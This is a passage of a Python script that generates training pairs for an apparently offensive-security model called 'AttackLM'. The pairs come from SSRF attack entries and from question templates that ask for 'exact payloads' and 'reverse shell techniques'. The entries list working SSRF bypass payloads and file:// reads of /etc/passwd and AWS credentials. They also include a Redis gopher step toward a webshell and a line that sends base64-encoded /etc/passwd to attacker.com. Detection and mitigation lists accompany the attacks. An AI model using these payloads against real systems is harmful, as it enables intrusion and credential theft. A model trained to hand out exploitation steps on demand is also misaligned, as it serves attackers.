            "`http://ssrf.evil.com/` (DNS rebinding: public then 127.0.0.1)",
            "`http://evil.com@127.0.0.1/admin` (userinfo bypass)",
            "`http://allowed.com#@127.0.0.1` (fragment-based)",
        ],
        "detection": [
            "Redirect chains leading to internal IPs",
            "DNS resolution changes for same hostname",
            "Userinfo in URL parameters (@-based URLs)",
            "URL parsing inconsistencies between WAF and application",
        ],
        "mitigations": [
            "Follow and validate ALL redirect chains before making request",
            "DNS pinning: resolve hostname once and use that IP",
            "Validate resolved IP, not just hostname",
            "Block all private/metadata IP ranges after resolution",
        ],
    },
    {
        "category": "ssrf",
        "mitre_ids": ["T1071.001"],
        "name": "SSRF with IP Encoding (Decimal, Octal, Hex)",
        "desc": "Bypassing SSRF IP blocklists using alternative IP address representations.",
        "steps": "1. Decimal encoding: `127.0.0.1` → `2130706433` (`?url=http://2130706433/admin`)\n2. Octal encoding: `127.0.0.1` → `0177.0.0.1` (`?url=http://0177.0.0.1/admin`)\n3. Hex encoding: `127.0.0.1` → `0x7f.0x0.0x1` or `0x7f000001` (`?url=http://0x7f000001`)\n4. Mixed encoding: `0x7f.0.0.1`, `0177.0x0.1`\n5. IPv6 encoding: `?url=http://[::1]/admin` or `?url=http://[0:0:0:0:0:0:0:1]/admin`",
        "payloads": [
            "`http://2130706433/admin` (decimal: 127.0.0.1)",
            "`http://0177.0.0.1/admin` (octal: 127.0.0.1)",
            "`http://0x7f000001/admin` (hex: 127.0.0.1)",
            "`http://0x7f.0x0.0x1/admin` (hex dotted: 127.0.0.1)",
            "`http://[::1]/admin` (IPv6 loopback)",
        ],
        "detection": [
            "Alternative IP representations in URL parameters",
            "Decimal/octal/hex IP addresses in requests",
            "IPv6 loopback addresses in SSRF-prone parameters",
            "WAF failing to normalize IP representations",
        ],
        "mitigations": [
            "Normalize all IP representations before validation",
            "Resolve hostname to IP and validate against blocklist",
            "Block IPv6 loopback (::1) and mapped addresses",
            "Use IP address parsing libraries for proper comparison",
        ],
    },
    {
        "category": "ssrf",
        "mitre_ids": ["T1071.001"],
        "name": "SSRF to Internal Services (Redis, MySQL, Elasticsearch)",
        "desc": "Using SSRF to interact with internal services that lack authentication on the internal network.",
        "steps": "1. Identify SSRF point and scan internal ports\n2. Redis (6379): `dict://127.0.0.1:6379/INFO` or `gopher://127.0.0.1:6379/_INFO`\n3. MySQL (3306): craft gopher protocol payload for MySQL protocol\n4. Elasticsearch (9200): `http://127.0.0.1:9200/_cat/indices`\n5. Exploit Redis for RCE: `gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html` then write webshell",
        "payloads": [
            "`dict://127.0.0.1:6379/INFO` (Redis)",
            "`gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html` (Redis RCE)",
            "`http://127.0.0.1:9200/_cat/indices` (Elasticsearch)",
            "`http://127.0.0.1:9200/_search?q=*` (Elasticsearch data extraction)",
            "`gopher://127.0.0.1:3306/...` (MySQL protocol manipulation)",
        ],
        "detection": [
            "Requests to internal service ports via SSRF parameters",
            "dict:// and gopher:// URL schemes in requests",
            "Redis/MySQL/Elasticsearch data in HTTP responses",
            "Internal service protocol traffic from web application",
        ],
        "mitigations": [
            "Block dict://, gopher://, and other dangerous URL schemes",
            "Network segmentation isolating internal services",
            "Require authentication on all internal services (Redis AUTH, etc.)",
            "Egress filtering limiting outbound protocols",
            "Service mesh with mTLS for internal communication",
        ],
    },
    {
        "category": "ssrf",
        "mitre_ids": ["T1071.001"],
        "name": "SSRF via file:// Protocol",
        "desc": "Using the file:// URL scheme in SSRF to read local files on the server.",
        "steps": "1. Test file:// protocol: `?url=file:///etc/passwd`\n2. Read application source: `?url=file:///var/www/html/config.php`\n3. Read environment variables: `?url=file:///proc/self/environ`\n4. Read AWS credentials: `?url=file:///home/user/.aws/credentials`\n5. Test on Windows: `?url=file:///C:/Windows/win.ini`",
        "payloads": [
            "`file:///etc/passwd`",
            "`file:///var/www/html/config.php`",
            "`file:///proc/self/environ`",
            "`file:///home/user/.aws/credentials`",
            "`file:///C:/Windows/win.ini`",
        ],
        "detection": [
            "file:// URL scheme in request parameters",
            "Local file content in HTTP responses",
            "Requests using file:// protocol from web application",
            "Sensitive file paths in SSRF parameters",
        ],
        "mitigations": [
            "Disable file:// URL scheme in HTTP client configuration",
            "Whitelist allowed URL schemes (http://, https:// only)",
            "Validate URL scheme before making any request",
            "Sandbox HTTP client to prevent local file access",
        ],
    },
    {
        "category": "ssrf",
        "mitre_ids": ["T1071.001"],
        "name": "SSRF Blind Detection",
        "desc": "Detecting and exploiting blind SSRF where the server's response does not directly include the target's response content.",
        "steps": "1. Identify blind SSRF: no direct response from target URL in HTTP response\n2. Use out-of-band detection: `?url=http://attacker-dns-callback.example.com/test`\n3. Time-based detection: `?url=http://internal-host:80` (fast) vs `?url=http://internal-host:81` (slow/connection refused)\n4. Port scanning via timing: measure response times for different internal ports\n5. Data exfiltration: `?url=http://attacker.com/exfil?data=$(cat /etc/passwd | base64)` or DNS exfil",
        "payloads": [
            "`http://attacker-callback.example.com/ssrf-test-UNIQUEID` (OOB DNS)",
            "`http://internal-host:80/` (time-based: fast=port open, slow=port closed)",
            "`http://attacker.com/log?d=` + base64-encoded sensitive data (exfiltration)",
            "`gopher://internal-redis:6379/_PING` (blind service interaction)",
        ],
        "detection": [
            "Out-of-band DNS/HTTP callbacks from server",
            "Response time differences correlating with port scanning",
            "Unexpected outbound connections from web server",
            "URL parameter values pointing to callback infrastructure",
        ],
        "mitigations": [
            "Block all outbound connections except to allowlisted services",
            "Network egress filtering and monitoring",
            "DNS monitoring for unusual query patterns from servers",
            "Outbound proxy with strict allowlisting",
        ],
    },
]

QUESTION_TEMPLATES = {
    "sql_injection": [
        "Explain {name} and provide a step-by-step exploitation walkthrough with payloads.",
        "How does {name} work? Show me the attack steps, detection methods, and mitigations.",
        "Walk me through a {name} attack against a web application. Include payloads and remediation.",
        "I'm performing a web application security assessment. Demonstrate {name} with exact payloads.",
        "What is {name}? Provide exploitation steps, example payloads, and defense strategies.",
        "For a red team exercise, detail the {name} attack technique including injection payloads.",
        "Describe {name} from the attacker's perspective. What are the key payloads and mitigations?",
        "As a {severity_level} security researcher, explain {name} for {environment_type} environments.",
        "In a {environment_type} setting, how would you detect {name}? What {framework} controls apply?",
        "Compare {name} detection approaches using {framework} guidelines versus practical red team findings.",
        "For a {severity_level} severity assessment in {environment_type}, walk through {name} step by step.",
        "What {framework} techniques map to {name}? Include detection and mitigation strategies.",
        "Explain {name} in the context of {environment_type}. What are the most effective payloads?",
        "How would you test for {name} in a {environment_type}? Include {framework}-aligned remediation.",
        "Map {name} to {framework} techniques. Describe detection signatures and defensive controls.",
        "During a {severity_level} severity penetration test of a {environment_type}, demonstrate {name}.",
        "What {framework} testing procedures cover {name}? Provide payloads and countermeasures.",
        "Analyze {name} for a {environment_type}. Which {framework} mitigations are most effective?",
        "Describe the {name} attack chain for a {environment_type}. Reference {framework} detection strategies.",
        "How does {name} impact a {environment_type}? Show {framework}-aligned exploitation and defense.",
        "For {framework} compliance in a {environment_type}, explain {name} risks and testing methodology.",
        "What is the {severity_level} impact of {name} on a {environment_type}? Detail exploitation and remediation.",
        "Evaluate {name} risk using {framework} methodology for a {environment_type} deployment.",
        "In {environment_type} architecture, how would an adversary leverage {name}? Include {framework} mapping.",
        "Provide a {framework}-aligned security testing procedure for {name} in {environment_type}.",
    ],
    "xss": [
        "Explain {name} with detailed exploitation steps and bypass techniques.",
        "How would an attacker perform {name}? Include payloads and detection methods.",
        "Demonstrate {name} with example payloads. What are the key evasion techniques?",
        "For a web security assessment, walk me through {name} exploitation and mitigation.",
        "What are the most effective {name} payloads? Include filter bypass techniques.",
        "Describe {name} attack patterns. How can we detect and prevent them?",
        "As a {severity_level} security researcher, explain {name} for {environment_type} environments.",
        "In a {environment_type} setting, how would you detect {name}? What {framework} controls apply?",
        "Compare {name} detection approaches using {framework} guidelines versus practical red team findings.",
        "For a {severity_level} severity assessment in {environment_type}, walk through {name} step by step.",
        "What {framework} techniques map to {name}? Include detection and mitigation strategies.",
        "Explain {name} in the context of {environment_type}. What are the most effective payloads?",
        "How would you test for {name} in a {environment_type}? Include {framework}-aligned remediation.",
        "Map {name} to {framework} techniques. Describe detection signatures and defensive controls.",
        "During a {severity_level} severity penetration test of a {environment_type}, demonstrate {name}.",
        "What {framework} testing procedures cover {name}? Provide payloads and countermeasures.",
        "Analyze {name} for a {environment_type}. Which {framework} mitigations are most effective?",
        "Describe the {name} attack chain for a {environment_type}. Reference {framework} detection strategies.",
        "How does {name} impact a {environment_type}? Show {framework}-aligned exploitation and defense.",
        "For {framework} compliance in a {environment_type}, explain {name} risks and testing methodology.",
        "What is the {severity_level} impact of {name} on a {environment_type}? Detail exploitation and remediation.",
        "Evaluate {name} risk using {framework} methodology for a {environment_type} deployment.",
        "In {environment_type} architecture, how would an adversary leverage {name}? Include {framework} mapping.",
        "Provide a {framework}-aligned security testing procedure for {name} in {environment_type}.",
        "Demonstrate {name} payload crafting and filter evasion for a {environment_type} security assessment.",
    ],
    "csrf": [
        "Explain {name} attacks with working exploit payloads and defense strategies.",
        "How does {name} work? Show me the attack flow and protection mechanisms.",
        "Demonstrate a {name} attack against a web application with code examples.",
        "What are the latest {name} attack techniques? Include mitigation strategies.",
        "Walk me through {name} exploitation. How do SameSite cookies affect the attack?",
        "As a {severity_level} security researcher, explain {name} for {environment_type} environments.",
        "In a {environment_type} setting, how would you detect {name}? What {framework} controls apply?",
        "Compare {name} detection approaches using {framework} guidelines versus practical red team findings.",
        "For a {severity_level} severity assessment in {environment_type}, walk through {name} step by step.",
        "What {framework} techniques map to {name}? Include detection and mitigation strategies.",
        "Explain {name} in the context of {environment_type}. What are the most effective payloads?",
        "How would you test for {name} in a {environment_type}? Include {framework}-aligned remediation.",
        "Map {name} to {framework} techniques. Describe detection signatures and defensive controls.",
        "During a {severity_level} severity penetration test of a {environment_type}, demonstrate {name}.",
        "What {framework} testing procedures cover {name}? Provide payloads and countermeasures.",
        "Analyze {name} for a {environment_type}. Which {framework} mitigations are most effective?",
        "Describe the {name} attack chain for a {environment_type}. Reference {framework} detection strategies.",
        "How does {name} impact a {environment_type}? Show {framework}-aligned exploitation and defense.",
        "For {framework} compliance in a {environment_type}, explain {name} risks and testing methodology.",
        "What is the {severity_level} impact of {name} on a {environment_type}? Detail exploitation and remediation.",
        "Evaluate {name} risk using {framework} methodology for a {environment_type} deployment.",
        "In {environment_type} architecture, how would an adversary leverage {name}? Include {framework} mapping.",
        "Provide a {framework}-aligned security testing procedure for {name} in {environment_type}.",
    ],
    "command_injection": [
        "Explain {name} with detailed exploitation steps and payload examples.",
        "How does {name} work? Show me the attack steps, payloads, and detection methods.",
        "Demonstrate {name} against a vulnerable web application. Include blind injection techniques.",
        "For a web pentest, detail {name} payloads and their detection in logs.",
        "What are the most dangerous {name} payloads? Include reverse shell techniques.",
        "As a {severity_level} security researcher, explain {name} for {environment_type} environments.",
        "In a {environment_type} setting, how would you detect {name}? What {framework} controls apply?",
        "Compare {name} detection approaches using {framework} guidelines versus practical red team findings.",
        "For a {severity_level} severity assessment in {environment_type}, walk through {name} step by step.",
        "What {framework} techniques map to {name}? Include detection and mitigation strategies.",
        "Explain {name} in the context of {environment_type}. What are the most effective payloads?",
        "How would you test for {name} in a {environment_type}? Include {framework}-aligned remediation.",
        "Map {name} to {framework} techniques. Describe detection signatures and defensive controls.",
        "During a {severity_level} severity penetration test of a {environment_type}, demonstrate {name}.",
        "What {framework} testing procedures cover {name}? Provide payloads and countermeasures.",
        "Analyze {name} for a {environment_type}. Which {framework} mitigations are most effective?",
        "Describe the {name} attack chain for a {environment_type}. Reference {framework} detection strategies.",
        "How does {name} impact a {environment_type}? Show {framework}-aligned exploitation and defense.",
        "For {framework} compliance in a {environment_type}, explain {name} risks and testing methodology.",
        "What is the {severity_level} impact of {name} on a {environment_type}? Detail exploitation and remediation.",
        "Evaluate {name} risk using {framework} methodology for a {environment_type} deployment.",
        "In {environment_type} architecture, how would an adversary leverage {name}? Include {framework} mapping.",
        "Provide a {framework}-aligned security testing procedure for {name} in {environment_type}.",
    ],
    "path_traversal": [
        "Explain {name} with exploitation steps and bypass techniques.",
        "How does {name} work? Show payloads for both Linux and Windows targets.",
        "Demonstrate {name} attacks including filter bypass and LFI techniques.",
        "What are the most effective {name} payloads? Include encoding bypass methods.",
        "Walk me through {name} exploitation with OS-specific payloads.",
        "As a {severity_level} security researcher, explain {name} for {environment_type} environments.",
        "In a {environment_type} setting, how would you detect {name}? What {framework} controls apply?",
        "Compare {name} detection approaches using {framework} guidelines versus practical red team findings.",
        "For a {severity_level} severity assessment in {environment_type}, walk through {name} step by step.",
        "What {framework} techniques map to {name}? Include detection and mitigation strategies.",
        "Explain {name} in the context of {environment_type}. What are the most effective payloads?",
        "How would you test for {name} in a {environment_type}? Include {framework}-aligned remediation.",
        "Map {name} to {framework} techniques. Describe detection signatures and defensive controls.",
        "During a {severity_level} severity penetration test of a {environment_type}, demonstrate {name}.",
        "What {framework} testing procedures cover {name}? Provide payloads and countermeasures.",
        "Analyze {name} for a {environment_type}. Which {framework} mitigations are most effective?",
        "Describe the {name} attack chain for a {environment_type}. Reference {framework} detection strategies.",
        "How does {name} impact a {environment_type}? Show {framework}-aligned exploitation and defense.",
        "For {framework} compliance in a {environment_type}, explain {name} risks and testing methodology.",
        "What is the {severity_level} impact of {name} on a {environment_type}? Detail exploitation and remediation.",
        "Evaluate {name} risk using {framework} methodology for a {environment_type} deployment.",
        "In {environment_type} architecture, how would an adversary leverage {name}? Include {framework} mapping.",
        "Provide a {framework}-aligned security testing procedure for {name} in {environment_type}.",
    ],
    "idor": [
        "Explain {name} with exploitation steps and defense strategies.",
        "How does {name} work? Show me attack scenarios and access control testing.",
        "Demonstrate {name} against a REST API. How do I test for authorization flaws?",
        "What are the best methods to detect {name} vulnerabilities? Include automated testing.",
        "Walk me through {name} testing with specific API examples and remediation.",
        "As a {severity_level} security researcher, explain {name} for {environment_type} environments.",
        "In a {environment_type} setting, how would you detect {name}? What {framework} controls apply?",
        "Compare {name} detection approaches using {framework} guidelines versus practical red team findings.",
        "For a {severity_level} severity assessment in {environment_type}, walk through {name} step by step.",
        "What {framework} techniques map to {name}? Include detection and mitigation strategies.",
        "Explain {name} in the context of {environment_type}. What are the most effective payloads?",
        "How would you test for {name} in a {environment_type}? Include {framework}-aligned remediation.",
        "Map {name} to {framework} techniques. Describe detection signatures and defensive controls.",
        "During a {severity_level} severity penetration test of a {environment_type}, demonstrate {name}.",
        "What {framework} testing procedures cover {name}? Provide payloads and countermeasures.",
        "Analyze {name} for a {environment_type}. Which {framework} mitigations are most effective?",
        "Describe the {name} attack chain for a {environment_type}. Reference {framework} detection strategies.",
        "How does {name} impact a {environment_type}? Show {framework}-aligned exploitation and defense.",
        "For {framework} compliance in a {environment_type}, explain {name} risks and testing methodology.",
        "What is the {severity_level} impact of {name} on a {environment_type}? Detail exploitation and remediation.",
        "Evaluate {name} risk using {framework} methodology for a {environment_type} deployment.",
        "In {environment_type} architecture, how would an adversary leverage {name}? Include {framework} mapping.",
        "Provide a {framework}-aligned security testing procedure for {name} in {environment_type}.",
    ],
    "ssrf": [
        "Explain {name} with exploitation steps and cloud metadata attacks.",
        "How does {name} work? Show me internal network scanning and cloud metadata access.",
        "Demonstrate {name} attacks against AWS, GCP, and Azure environments.",
        "What are the most impactful {name} scenarios? Include cloud credential theft.",
        "Walk me through {name} exploitation with specific cloud provider metadata endpoints.",
        "As a {severity_level} security researcher, explain {name} for {environment_type} environments.",
        "In a {environment_type} setting, how would you detect {name}? What {framework} controls apply?",
        "Compare {name} detection approaches using {framework} guidelines versus practical red team findings.",
        "For a {severity_level} severity assessment in {environment_type}, walk through {name} step by step.",
        "What {framework} techniques map to {name}? Include detection and mitigation strategies.",
        "Explain {name} in the context of {environment_type}. What are the most effective payloads?",
        "How would you test for {name} in a {environment_type}? Include {framework}-aligned remediation.",
        "Map {name} to {framework} techniques. Describe detection signatures and defensive controls.",
        "During a {severity_level} severity penetration test of a {environment_type}, demonstrate {name}.",
        "What {framework} testing procedures cover {name}? Provide payloads and countermeasures.",
        "Analyze {name} for a {environment_type}. Which {framework} mitigations are most effective?",
        "Describe the {name} attack chain for a {environment_type}. Reference {framework} detection strategies.",
        "How does {name} impact a {environment_type}? Show {framework}-aligned exploitation and defense.",
        "For {framework} compliance in a {environment_type}, explain {name} risks and testing methodology.",
        "What is the {severity_level} impact of {name} on a {environment_type}? Detail exploitation and remediation.",
        "Evaluate {name} risk using {framework} methodology for a {environment_type} deployment.",
        "In {environment_type} architecture, how would an adversary leverage {name}? Include {framework} mapping.",
        "Provide a {framework}-aligned security testing procedure for {name} in {environment_type}.",
    ],
}


def try_download_hf_dataset() -> list[dict] | None:
    """Attempt to download cybersecurity attack dataset from HuggingFace."""
    try:
        from datasets import load_dataset

        print("Attempting to download Cybersecurity_Attack dataset from HuggingFace...")
        ds = load_dataset("pucavv/Cybersecurity_Attack", split="train")
        print(f"Downloaded {len(ds)} records from HuggingFace.")

        pairs: list[dict] = []
        for row in ds:
            attack_type = str(row.get("attack_type", row.get("label", "")))
            description = str(row.get("text", row.get("description", "")))

            category = "sql_injection"
            mitre_ids = ["T1190.001"]
            for cat, ids in [
                ("sql_injection", ["T1190.001"]),
                ("xss", ["T1059.007"]),
                ("csrf", ["T1534"]),
                ("command_injection", ["T1059.004"]),
                ("path_traversal", ["T1083"]),
                ("idor", ["T1190.001"]),
                ("ssrf", ["T1071.001"]),
            ]:
                if (
                    cat.replace("_", " ") in attack_type.lower()
                    or cat in attack_type.lower()
                ):
                    category = cat
                    mitre_ids = ids
                    break

            user = f"Explain the web security attack: {attack_type}. Include attack description, detection methods, and mitigations."
            assistant = (
                f"**Attack Type: {attack_type}**\n\n**Description:** {description}\n\n"
            )

            pairs.append(
                {
                    "messages": [
                        {"role": "system", "content": SYSTEM_PROMPT},
                        {"role": "user", "content": user},
                        {"role": "assistant", "content": assistant.strip()},
                    ],
                    "mitre_ids": mitre_ids,
                    "source": "cybersecurity_attack_hf",
                    "license": LICENSE,
                }
            )
        return pairs if pairs else None
    except Exception as e:
        print(f"HuggingFace download failed: {e}")
        print("Falling back to synthetic generation...")
        return None


def generate_synthetic_pairs(count: int = 5) -> list[dict]:
    """Generate synthetic web attack training pairs with contextual variation.

    Args:
        count: Number of question template variants per attack entry.
    """
    random.seed(SEED)
    pairs: list[dict] = []

    for attack in WEB_ATTACKS:
        category = attack["category"]
        name = attack["name"]
        mitre_ids = attack["mitre_ids"]

        templates = QUESTION_TEMPLATES.get(
            category, QUESTION_TEMPLATES["sql_injection"]
        )
        n_variants = min(count, len(templates))
        chosen = random.sample(templates, n_variants)

        for q_template in chosen:
            env = random.choice(ENVIRONMENT_TYPES)
            severity = random.choice(SEVERITY_LEVELS)
            framework = random.choice(TESTING_FRAMEWORKS)

            user = q_template.format(
                name=name,
                category=category.replace("_", " ").title(),
                environment_type=env,
                severity_level=severity,
                framework=framework,
            )

            assistant = f"**{name}** (MITRE: {', '.join(mitre_ids)})\n\n"
            assistant += f"**Category:** {category.replace('_', ' ').title()}\n\n"
            assistant += f"**Environment:** {env}\n\n"
            assistant += f"**Severity:** {severity.title()}\n\n"
            assistant += f"**Framework Alignment:** {framework}\n\n"
            assistant += f"**Description:** {attack['desc']}\n\n"
            assistant += f"**Exploitation Steps:**\n{attack['steps']}\n\n"

            if attack.get("payloads"):
                assistant += (
                    "**Example Payloads:**\n```\n"
                    + "\n".join(attack["payloads"])
                    + "\n```\n\n"
                )

            if attack.get("detection"):
                det_str = "\n".join(f"- {d}" for d in attack["detection"])
                assistant += f"**Detection:**\n{det_str}\n\n"

            if attack.get("mitigations"):
                mit_str = "\n".join(f"- {m}" for m in attack["mitigations"])
                assistant += f"**Mitigations:**\n{mit_str}\n"

            assistant += f"\n**{framework} Reference:** This technique aligns with {framework} assessment methodology for {severity}-severity findings in {env} deployments.\n"

            pairs.append(
                {
                    "messages": [
                        {"role": "system", "content": SYSTEM_PROMPT},
                        {"role": "user", "content": user},
                        {"role": "assistant", "content": assistant.strip()},
                    ],
                    "mitre_ids": mitre_ids,
                    "source": SOURCE_NAME,
                    "license": LICENSE,
                }
            )

    random.shuffle(pairs)
    return pairs


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Acquire Web Attack dataset for AttackLM"
    )
    parser.add_argument(
        "--fallback",
        action="store_true",
        help="Skip HF download, use synthetic generation",
    )
    parser.add_argument("--output", default=None, help="Custom output directory")
    parser.add_argument(
        "--count",
        type=int,
        default=5,
        help="Number of question template variants per attack entry (default: 5)",
    )
    args = parser.parse_args()

    output_dir = Path(args.output) if args.output else BUCKET_DIR
    data_file = output_dir / "data_synth.jsonl"
    meta_file = output_dir / "metadata.json"

    pairs = None
    if not args.fallback:
        pairs = try_download_hf_dataset()

    if pairs is None:
        pairs = generate_synthetic_pairs(count=args.count)

    output_dir.mkdir(parents=True, exist_ok=True)
    with open(data_file, "w", encoding="utf-8") as f:
        for pair in pairs:
            f.write(json.dumps(pair, ensure_ascii=False) + "\n")

    from collections import Counter

    cat_counts = Counter()
    for p in pairs:
        for msg in p["messages"]:
            if msg["role"] == "assistant" and "**Category:**" in msg["content"]:
                for cat in [
                    "sql_injection",
                    "xss",
                    "csrf",
                    "command_injection",
                    "path_traversal",
                    "idor",
                    "ssrf",
                ]:
                    if cat.replace("_", " ").title() in msg["content"]:
                        cat_counts[cat] += 1
                        break

    mitre_ids_all: list[str] = []
    for p in pairs:
        mitre_ids_all.extend(p.get("mitre_ids", []))
    unique_mitre = sorted(set(mitre_ids_all))

    metadata = {
        "name": "attacks",
        "display_name": "Web Application Attacks",
        "category": "web_app",
        "mitre_tactic": "TA0001",
        "description": f"Web application attack dataset covering {len(cat_counts)} categories: {', '.join(cat_counts.keys())}. Includes SQL injection, XSS, CSRF, command injection, path traversal, IDOR, and SSRF.",
        "source_file": data_file.name,
        "created": datetime.now(timezone.utc).isoformat(),
        "count": len(pairs),
        "sub_sources": {"human": 0, "llm": 0, "synth": len(pairs)},
        "mitre_ids": unique_mitre,
        "variants_per_entry": args.count,
    }

    with open(meta_file, "w", encoding="utf-8") as f:
        json.dump(metadata, f, indent=2, ensure_ascii=False)

    print(f"\nWeb Attack dataset acquired:")
    print(f"  Pairs: {len(pairs)}")
    print(f"  Attack entries: {len(WEB_ATTACKS)}")
    print(f"  Variants per entry: {args.count}")
    print(f"  Categories: {dict(cat_counts)}")
    print(f"  MITRE IDs: {unique_mitre}")
    print(f"  Output: {data_file}")
    print(f"  Metadata: {meta_file}")


if __name__ == "__main__":
    main()
